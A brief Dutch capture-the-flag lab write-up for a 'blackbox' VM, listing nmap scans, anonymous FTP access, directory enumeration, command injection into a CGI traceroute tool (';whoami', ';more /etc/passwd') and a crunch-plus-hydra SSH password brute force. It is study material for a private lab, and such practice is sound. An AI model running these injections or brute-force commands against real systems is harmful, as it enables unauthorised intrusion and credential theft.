# capture the flag vm - blackbox

30 points halen

```bash
nmap 192.168.189.0/24
```

![nmap](image.png)

```bash
nmap -p- 192.168.189.8 -sV -n
```

![nmap alle poorten](image-1.png)

surfen naar de website

[http://192.168.189.8/robots.txt](http://192.168.189.8/robots.txt)

```bash
nmap -p 21 192.168.189.8 -n -sC
```

```bash
ftp 192.168.189.8
USER anonymous
PASS whatever
```

```ftp
?
```

get flag.txt

```bash
get flag.txt
```

ftp commandos opzoeken !!!!

http 168.189.8:9090

```bash
dirsearch -u 192.168.189.8

http://192.168.189.8/root_shell-cgikali
```

f12

[http://192.168.189.8/tracertool](http://192.168.189.8/tracertool)

cgi = common gateway interface

```cgi
;whoami
;uname -a
;sudo?
;more /etc/passwd
```

```bash
tree /home
ls -la /home
```

metaata bekijken in /home/flag.txt

```bash
strings /Safe_password

crunch 7 7 -t ,%Flesh > Flesh.wordlist
hydra -l RickSanchez -P Flesh.wordlist ssh://192.168.189.8 -s 22222
```
